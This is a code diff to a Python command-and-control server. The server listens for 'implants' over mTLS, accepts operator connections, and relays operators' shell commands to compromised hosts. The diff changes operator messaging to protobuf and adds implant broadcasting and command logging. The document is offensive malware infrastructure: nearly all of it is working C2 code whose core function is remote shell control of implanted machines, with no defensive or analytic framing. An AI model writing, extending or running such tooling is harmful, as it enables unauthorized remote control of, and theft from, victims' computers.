@@ -8,28 +8,29 @@ from mtls import mtls
 from generate.generate import generate
 from queue import Queue
 from handler.handler import Handler
+from pb import operatorpb_pb2
 
 import socket
 import threading
-import uuid
 
 class C2Server(object):
     connections = []
 
     def __init__(self):
         self.shutdown = 0
+        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
 
         ## Generating stuff for implant comms ##
         print("Listening for implants...")
-        self.requestq = Queue() #this is a shared que between the handler and the listner, which fills with implant registration
+        self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
         self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption
-        self.handler = Handler(self.requestq)
-        self.handler.start()
-
 
         ## Generating stuff for operator comms ##
         print("Listening for operators...")
-        self.clients = dict()
+        self.clients = list()
+
+        self.handler = Handler(self.requestq, self.clients)
+        self.handler.start()
 
         self.host = ''
         self.port = 12345
@@ -42,28 +43,54 @@ class C2Server(object):
         while self.shutdown == 0:
             pass
 
+    # Turn message into a protobuf Message and ssend to client
+    def sendClient(self, message, client):
+        response = operatorpb_pb2.ServerCmdOutput(cmdOutput=message)
+
+        message = operatorpb_pb2.Message(
+            message_type=operatorpb_pb2.Message.MessageType.ServerCmdOutput,
+            data=response.SerializeToString()
+        )
+
+        client.send(message.SerializeToString())
+
     def shell_session(self, session_id, client):
             conn, addr = self.implantlistener.sessions.get(session_id) 
-            client.send((f"Using session with {addr}\n").encode("ascii"))
+            
+            # send to client that new session is connected
+            message = operatorpb_pb2.Message(
+                message_type=operatorpb_pb2.Message.MessageType.SessionConnected,
+                data = operatorpb_pb2.SessionConnected(addr=str(addr)).SerializeToString()
+            )
+
+            client.send(message.SerializeToString())
 
             while True:
                 userin = client.recv(1024)
 
-                if userin == b"exit":
-                   client.send((f"Exiting session {addr}\n").encode("ascii"))
-                   break 
+                message = operatorpb_pb2.Message()
+                message.ParseFromString(userin)
 
-                output = mtls.session(conn, userin)
+                if message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
+                    server_cmd = operatorpb_pb2.ServerCmd()
+                    server_cmd.ParseFromString(message.data)
 
-                if not output:
-                    break
 
-                client.send(output) 
+                    if server_cmd.cmd == b"exit":
+                       self.sendClient((f"Exiting session {addr}\n").encode("ascii"),client)
+                       break 
+
+                    output = mtls.session(conn, server_cmd.cmd)
+
+                    if not output:
+                        break
+
+                    self.sendClient(output.decode("ascii"),client)
 
     def executecommand(self, command, client):
         #command is an array of strings
         if len(command) < 1:
-            client.send(b"Plase enter a command")
+            self.sendClient("Please enter a command", client)
             return
 
         elif command[0] == "sessions":
@@ -93,9 +120,8 @@ class C2Server(object):
         while True: #keep listening, start a new thread when a client connects
             client, address = self.sock.accept()
 
-            id = str(uuid.uuid4())
-            self.clients[id] = (client, address)
-
+            self.clients.append(client)
+            self.handler.brodcastImplants(client)
 
             print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
             t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
@@ -105,23 +131,26 @@ class C2Server(object):
         size = 1024
         while True:
             data = client.recv(size)
-            if data and (str(data.decode('ascii')).lower() != 'exit'):
-                recvData = str(data.decode('ascii')).lower()
 
-                response = self.executecommand(recvData.split(), client)
+            message = operatorpb_pb2.Message()
+            message.ParseFromString(data)
 
-                logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-                commandStr = ' '.join(recvData)
+            if message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
+                server_cmd = operatorpb_pb2.ServerCmd()
+                server_cmd.ParseFromString(message.data)
+                commandStr = server_cmd.cmd.lower()
+
                 logging.info("Command: " + commandStr)
 
-                if response:
-                    client.send(response)
-
-            else:
-                print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
-                client.close()
-                break
-
+                if (commandStr != "exit"):
+                    response = self.executecommand(commandStr.split(), client)
+                    if response:
+                        self.sendClient(response, client)
+                else:
+                    print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
+                    client.close()
+                    self.clients.remove(client)
+                    break
 
 def main():
     C2Server().serverMain()
